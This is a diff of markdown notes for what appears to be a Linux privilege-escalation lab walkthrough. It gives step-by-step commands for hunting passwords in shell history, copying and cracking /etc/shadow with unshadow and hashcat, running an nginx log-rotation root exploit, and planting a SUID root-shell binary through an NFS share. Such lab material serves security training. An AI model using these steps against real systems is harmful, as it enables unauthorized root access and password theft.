@@ -44,7 +44,7 @@ command : `cat ~/.bash_history | grep -i passw`
 
 # 4. Privilage Escalation - Weak File Permissions
 ## Detection
-1. `ls -la /etc/shadow `		>> note the file permissions
+1. `ls -la /etc/shadow `		>> note the file permissions  
 `-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow`
 
 ## Exploitation
@@ -53,13 +53,10 @@ command : `cat ~/.bash_history | grep -i passw`
 3. In command prompt type: `cat /etc/shadow`
 4. Save the output to a file on your attacker machine
 
-<in attacker box >
+**Attacker box**
 	
-1. In command prompt type: `unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt`
-
-Now:
-	
-`hashcat -m 1800 unshadowed.txt rockyou.txt -O`
+1. In command prompt type: `unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt`  
+2. `hashcat -m 1800 unshadowed.txt rockyou.txt -O`
 
 # 5. Privilage Escalation - SSH Keys
 ## Detection
@@ -192,22 +189,20 @@ void inject() {
 **Target box** – Terminal 1
 
 1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su root
-2. The root password is password123
-3. Once escalated to root, in command prompt type: su -l www-data
-4. In command prompt type: `/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log`
-5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.
+2. Once escalated to root, in command prompt type: su -l www-data
+3. In command prompt type: `nginxed-root.sh /var/log/nginx/error.log`
+4. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.
 
 **Target box** – Terminal 2
 
 1. Once logged in, type: su root
-2. The root password is password123
-3. As root, type the following: invoke-rc.d nginx rotate >/dev/null 2>&1
-4. Switch back to the previous terminal.
+2. As root, type the following: `invoke-rc.d nginx rotate >/dev/null 2>&1`
+3. Switch back to the previous terminal.
 
 **Target box** – Terminal 1
 
 1. From the output, notice that the exploit continued its execution.
-2. In command prompt type: id
+2. In command prompt type: `id`
 
 # 11. Privilage Escalation -  SUID (Environment Variables #1) 
 ## Detection
@@ -265,7 +260,7 @@ void inject() {
 1. In command prompt type: `getcap -r / 2>/dev/null`
 2. From the output, notice the value of the “cap_setuid” capability.
 
-Exploitation
+## Exploitation
 
 **Target box**
 
@@ -348,8 +343,8 @@ Exploitation
 
 1. Open command prompt and type: `showmount -e 10.10.75.233`
 2. In command prompt type: `mkdir /tmp/1`
-3. In command prompt type: `mount -o rw,vers=2 10.10.75.233:/tmp /tmp/1`
-In command prompt type:
+3. In command prompt type: `mount -o rw,vers=2 10.10.75.233:/tmp /tmp/1`  
+In command prompt type:  
 `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`
 4. In command prompt type: `gcc /tmp/1/x.c -o /tmp/1/x`
 5. In command prompt type: `chmod +s /tmp/1/x`
